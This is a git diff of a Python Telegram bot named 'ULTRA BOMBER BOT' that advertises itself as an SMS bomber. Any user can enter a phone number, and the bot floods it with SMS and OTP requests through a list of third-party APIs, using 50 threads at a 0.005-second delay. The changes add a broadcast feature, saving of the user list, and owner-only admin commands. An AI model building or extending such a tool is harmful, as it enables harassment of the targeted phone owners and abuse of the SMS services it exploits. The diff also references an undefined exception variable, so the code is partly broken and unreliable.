@@ -1,10 +1,12 @@
-
 # ============================================================
 # 🔥 ULTRA BOMBER BOT 🔥
 # ============================================================
-# ✅ Stop hote hi sirf "BOMBING STOPPED!" dikhega
-# ✅ Results nahi dikhenge
-# ✅ Baki sab features same
+# ✅ BROADCAST — TERA CODE (copy_message)
+# ✅ NO PREMIUM EMOJIS
+# ✅ Admin panel — ONLY OWNER
+# ✅ Direct number input
+# ✅ Stop hote sirf "BOMBING STOPPED!"
+# ✅ Speed: 0.005s — Threads: 50
 # ============================================================
 
 from flask import Flask, request, jsonify
@@ -50,6 +52,18 @@ def send_message(chat_id, text, reply_markup=None):
     }
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
+    try:
+        return requests.post(url, json=payload, timeout=10).json()
+    except:
+        return None
+
+def copy_message(chat_id, from_chat_id, message_id):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/copyMessage"
+    payload = {
+        "chat_id": chat_id,
+        "from_chat_id": from_chat_id,
+        "message_id": message_id
+    }
     try:
         return requests.post(url, json=payload, timeout=10).json()
     except:
@@ -109,7 +123,6 @@ def api_list_inline(apis):
 def bold(text): return f"<b>{text}</b>"
 def quote(text): return f"<blockquote>{text}</blockquote>"
 def code(text): return f"<code>{text}</code>"
-def premium_emoji(): return "⭐️✨🔥💎⚡️🌟"
 
 # ====== API FUNCTIONS ======
 def parse_api_input(text):
@@ -171,7 +184,7 @@ def run_bombing(chat_id, phone, bomber_id):
     start_time = time.time()
     
     send_message(chat_id,
-        f"{bold('💀 BOMBING STARTED!')} {premium_emoji()}\n\n"
+        f"{bold('💀 BOMBING STARTED!')}\n\n"
         f"📱 {bold('Target:')} {code(phone)}\n"
         f"📡 {bold('APIs:')} {len(API_DB)}\n"
         f"⚡ {bold('Threads:')} {THREADS}\n"
@@ -184,7 +197,7 @@ def run_bombing(chat_id, phone, bomber_id):
         if time.time() - user_bomb_start.get(chat_id, 0) > MAX_BOMB_DURATION:
             active_sessions[chat_id]["running"] = False
             send_message(chat_id, 
-                f"{bold('⏰ TIME LIMIT REACHED!')} {premium_emoji()}\n\n"
+                f"{bold('⏰ TIME LIMIT REACHED!')}\n\n"
                 f"{quote('5-minute limit exceeded.')}",
                 reply_markup=main_keyboard(chat_id)
             )
@@ -199,7 +212,7 @@ def run_bombing(chat_id, phone, bomber_id):
         if cycle % 10 == 0:
             remaining = int(MAX_BOMB_DURATION - (time.time() - user_bomb_start.get(chat_id, 0)))
             send_message(chat_id,
-                f"{bold('📊 UPDATE')} {premium_emoji()}\n\n"
+                f"{bold('📊 UPDATE')}\n\n"
                 f"✅ {bold('Success:')} {success}\n"
                 f"❌ {bold('Failed:')} {failed}\n"
                 f"⏰ {bold('Remaining:')} {remaining}s",
@@ -207,11 +220,9 @@ def run_bombing(chat_id, phone, bomber_id):
             )
         time.sleep(DELAY)
     
-    # ====== FIX: Stop hote hi sirf "BOMBING STOPPED!" ======
     if chat_id in active_sessions:
-        # Send final message only if not already sent
         send_message(chat_id,
-            f"{bold('✅ BOMBING STOPPED!')} {premium_emoji()}\n\n"
+            f"{bold('✅ BOMBING STOPPED!')}\n\n"
             f"{quote('Bombing session has been terminated.')}",
             reply_markup=main_keyboard(chat_id)
         )
@@ -223,7 +234,7 @@ def run_bombing(chat_id, phone, bomber_id):
 def handle_start(chat_id):
     user_db.add(chat_id)
     send_message(chat_id,
-        f"{bold('🔥 ULTRA BOMBER BOT 🔥')} {premium_emoji()}\n\n"
+        f"{bold('🔥 ULTRA BOMBER BOT 🔥')}\n\n"
         f"{quote('The most brutal SMS bomber on Telegram!')}\n\n"
         f"📡 {bold('APIs:')} {len(API_DB)}\n"
         f"⚡ {bold('Threads:')} {THREADS}\n"
@@ -234,7 +245,7 @@ def handle_start(chat_id):
     )
 
 def handle_apis(chat_id):
-    text = f"{bold('📡 ALL APIS')} {premium_emoji()}\n\n"
+    text = f"{bold('📡 ALL APIS')}\n\n"
     for idx, api in enumerate(API_DB):
         text += f"{idx+1}. {bold(api['name'])}\n{code(api['url'])}\n\n"
     text += f"\n{bold('Total:')} {len(API_DB)} APIs"
@@ -243,7 +254,7 @@ def handle_apis(chat_id):
 def handle_bomb(chat_id):
     user_states[chat_id] = "waiting_phone"
     send_message(chat_id,
-        f"{bold('💀 START BOMBING')} {premium_emoji()}\n\n"
+        f"{bold('💀 START BOMBING')}\n\n"
         f"{quote('Please enter the 10-digit phone number:')}\n\n"
         f"📝 {bold('Example:')} {code('9876543210')}",
         reply_markup=main_keyboard(chat_id)
@@ -259,9 +270,8 @@ def handle_bomb_command(chat_id, phone):
 def handle_stop(chat_id):
     if chat_id in active_sessions and active_sessions[chat_id]["running"]:
         active_sessions[chat_id]["running"] = False
-        # Stop button se bhi sirf "BOMBING STOPPED!" dikhega
         send_message(chat_id,
-            f"{bold('✅ BOMBING STOPPED!')} {premium_emoji()}\n\n"
+            f"{bold('✅ BOMBING STOPPED!')}\n\n"
             f"{quote('Bombing session has been terminated.')}",
             reply_markup=main_keyboard(chat_id)
         )
@@ -271,9 +281,8 @@ def handle_stop(chat_id):
 def handle_stop_callback(chat_id):
     if chat_id in active_sessions and active_sessions[chat_id]["running"]:
         active_sessions[chat_id]["running"] = False
-        # Callback se bhi sirf "BOMBING STOPPED!" dikhega
         send_message(chat_id,
-            f"{bold('✅ BOMBING STOPPED!')} {premium_emoji()}\n\n"
+            f"{bold('✅ BOMBING STOPPED!')}\n\n"
             f"{quote('Bombing session has been terminated.')}",
             reply_markup=main_keyboard(chat_id)
         )
@@ -283,29 +292,30 @@ def handle_admin_panel(chat_id):
         send_message(chat_id, f"{bold('❌ ACCESS DENIED!')}", reply_markup=main_keyboard(chat_id))
         return
     send_message(chat_id,
-        f"{bold('👑 ADMIN PANEL')} {premium_emoji()}\n\n"
+        f"{bold('👑 ADMIN PANEL')}\n\n"
         f"📡 {bold('APIs:')} {len(API_DB)}\n"
         f"👥 {bold('Users:')} {len(user_db)}",
         reply_markup=admin_keyboard()
     )
 
+# ====== BROADCAST (TERA CODE) ======
 def handle_broadcast(chat_id):
     if str(chat_id) != OWNER_ID:
         send_message(chat_id, f"{bold('❌ ACCESS DENIED!')}", reply_markup=main_keyboard(chat_id))
         return
     user_states[chat_id] = "waiting_broadcast"
     send_message(chat_id,
-        f"{bold('📢 BROADCAST')} {premium_emoji()}\n\n"
-        f"{quote('Please enter your broadcast message:')}\n\n"
-        f"📝 {bold('You can use:')}\n"
-        f"• {bold('Bold')} — {code('<b>text</b>')}\n"
-        f"• {bold('Quote')} — {code('<blockquote>text</blockquote>')}\n"
-        f"• {bold('Code')} — {code('<code>text</code>')}\n"
-        f"• {bold('Premium Emojis:')} {premium_emoji()}",
+        f"{bold('📢 BROADCAST')}\n\n"
+        f"{quote('Reply to any message with /broadcast')}\n\n"
+        f"📝 {bold('Works with:')}\n"
+        f"• Text (Bold, Italic, Code, Quote)\n"
+        f"• Photos / Videos / Documents\n"
+        f"• Stickers\n\n"
+        f"{quote('Just reply to any message with /broadcast')}",
         reply_markup=admin_keyboard()
     )
 
-def send_broadcast_message(chat_id, broadcast_text):
+def handle_broadcast_reply(chat_id, reply_to_message):
     if str(chat_id) != OWNER_ID:
         send_message(chat_id, f"{bold('❌ ACCESS DENIED!')}", reply_markup=main_keyboard(chat_id))
         return
@@ -315,42 +325,61 @@ def send_broadcast_message(chat_id, broadcast_text):
         send_message(chat_id, f"{bold('📭 NO USERS!')}", reply_markup=admin_keyboard())
         return
     
-    # Add premium emojis if not already
-    if not any(emoji in broadcast_text for emoji in ["⭐️", "✨", "🔥", "💎", "⚡️", "🌟"]):
-        broadcast_text = f"{premium_emoji()} {broadcast_text}"
+    from_chat_id = reply_to_message["chat"]["id"]
+    message_id = reply_to_message["message_id"]
     
     send_message(chat_id,
-        f"{bold('📢 BROADCAST STARTED!')} {premium_emoji()}\n\n"
-        f"👥 {bold('Users:')} {len(users)}\n"
-        f"📝 {bold('Message:')}\n{quote(broadcast_text[:100])}...",
+        f"{bold('📢 BROADCAST STARTED!')}\n\n"
+        f"👥 {bold('Users:')} {len(users)}",
         reply_markup=admin_keyboard()
     )
     
-    success, failed = 0, 0
+    sent, failed = 0, 0
     for chat in users:
         try:
-            send_message(chat, broadcast_text)
-            success += 1
+            copy_message(chat, from_chat_id, message_id)
+            sent += 1
         except:
             failed += 1
-        time.sleep(0.1)
+            if "blocked" in str(e).lower():
+                user_db.discard(chat)
+        time.sleep(0.05)
     
+    save_users()
     send_message(chat_id,
-        f"{bold('✅ BROADCAST COMPLETED!')} {premium_emoji()}\n\n"
-        f"✅ {bold('Success:')} {success}\n"
+        f"{bold('✅ BROADCAST COMPLETED!')}\n\n"
+        f"✅ {bold('Sent:')} {sent}\n"
         f"❌ {bold('Failed:')} {failed}",
         reply_markup=admin_keyboard()
     )
 
 def handle_help(chat_id):
     send_message(chat_id,
-        f"{bold('ℹ️ HELP')} {premium_emoji()}\n\n"
+        f"{bold('ℹ️ HELP')}\n\n"
         f"💀 {bold('Start Bombing:')} Click the button\n"
         f"🛑 {bold('Stop Bombing:')} Click the button\n"
         f"📡 {bold('APIs:')} /apis\n"
-        f"👑 {bold('Admin:')} /broadcast, /setapi",
+        f"👑 {bold('Admin:')} /broadcast (reply to any message)\n"
+        f"➕ {bold('Add API:')} /setapi name=MyAPI url=https://api.com",
         reply_markup=main_keyboard(chat_id)
     )
+
+# ====== SAVE USERS ======
+def save_users():
+    try:
+        with open("users.json", "w") as f:
+            json.dump(list(user_db), f)
+    except:
+        pass
+
+def load_users():
+    try:
+        with open("users.json", "r") as f:
+            data = json.load(f)
+            for user in data:
+                user_db.add(user)
+    except:
+        pass
 
 # ====== POLLING LOOP ======
 def polling_loop():
@@ -399,7 +428,6 @@ def polling_loop():
                 
                 user_db.add(chat_id)
                 
-                # Check if user is waiting for input
                 if chat_id in user_states:
                     if user_states[chat_id] == "waiting_phone":
                         del user_states[chat_id]
@@ -407,7 +435,7 @@ def polling_loop():
                         continue
                     elif user_states[chat_id] == "waiting_broadcast":
                         del user_states[chat_id]
-                        send_broadcast_message(chat_id, text)
+                        handle_broadcast_reply(chat_id, message)
                         continue
                 
                 if text == "/start":
@@ -441,11 +469,14 @@ def polling_loop():
                     send_message(chat_id, "✅ Back!", reply_markup=main_keyboard(chat_id))
                 elif text.startswith("/broadcast"):
                     if str(chat_id) == OWNER_ID:
-                        parts = text.split(maxsplit=1)
-                        if len(parts) > 1:
-                            send_broadcast_message(chat_id, parts[1])
+                        if "reply_to_message" in message:
+                            handle_broadcast_reply(chat_id, message["reply_to_message"])
                         else:
-                            handle_broadcast(chat_id)
+                            send_message(chat_id,
+                                f"{bold('📢 REPLY TO A MESSAGE')}\n\n"
+                                f"{quote('Reply to any message with /broadcast')}",
+                                reply_markup=admin_keyboard()
+                            )
                     else:
                         send_message(chat_id, "❌ Access Denied!")
                 elif text in ["ℹ️ Help", "/help"]:
@@ -474,6 +505,7 @@ if __name__ == "__main__":
     print(f"📡 APIs: {len(API_DB)}")
     print(f"👑 Owner: {OWNER_ID}")
     
+    load_users()
     threading.Thread(target=polling_loop, daemon=True).start()
     
     port = int(os.environ.get("PORT", 5000))
